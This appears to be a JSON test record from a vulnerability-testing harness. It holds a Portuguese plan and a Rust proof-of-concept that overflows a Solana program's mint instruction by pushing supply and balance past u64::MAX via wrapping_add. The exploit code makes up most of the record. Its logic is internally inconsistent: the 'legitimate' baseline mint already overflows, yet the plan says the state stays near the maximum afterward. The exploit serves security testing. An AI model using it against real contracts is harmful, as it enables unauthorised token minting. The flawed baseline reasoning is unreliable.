{
  "plan": "Preparo uma conta ledger com supply e balance proximos de u64::MAX (ex.: u64::MAX - 5) e chamo mint com amount=10 como baseline legitimo, que deve ter sucesso e gravar os valores somados. Em seguida, ataco a mesma instrucao mint com amount=10 sobre o estado resultante do baseline, onde supply e balance ja estao em u64::MAX - 5, fazendo wrapping_add estourar. O efeito medido e que supply e balance apos o ataque ficam menores que os valores anteriores (reiniciaram para perto de zero), demonstrando o overflow silencioso.",
  "scenario": "let ledger_key = Pubkey::new_unique();
let mut ledger_data = vec![0u8; 56];
let initial_supply: u64 = u64::MAX - 5;
let initial_balance: u64 = u64::MAX - 5;
ledger_data[40..48].copy_from_slice(&initial_supply.to_le_bytes());
ledger_data[48..56].copy_from_slice(&initial_balance.to_le_bytes());
let ledger = account(&env.program_id, &ledger_data, None);

let amount: u64 = 10;
let mut ix_data = vec![0u8];
ix_data.extend_from_slice(&amount.to_le_bytes());
let ix = env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, false)]);

let contas = vec![(ledger_key, ledger.clone())];
let r_base = env.baseline("mint legitimo com amount=10", &ix, &contas);

let ledger_pos_base = after(&r_base, &ledger_key).clone();
let contas_ataque = vec![(ledger_key, ledger_pos_base)];
let r = env.attack("mint com amount=10 sobre supply/balance em u64::MAX-5", &ix, &contas_ataque);

if r.program_result == ProgramResult::Success {
    let data = after(&r, &ledger_key).data();
    let supply_apos = read_u64(data, 40);
    let balance_apos = read_u64(data, 48);
    env.effect("supply reiniciou para valor menor que o anterior (overflow)", supply_apos < initial_supply);
    env.effect("balance reiniciou para valor menor que o anterior (overflow)", balance_apos < initial_balance);
}"
}

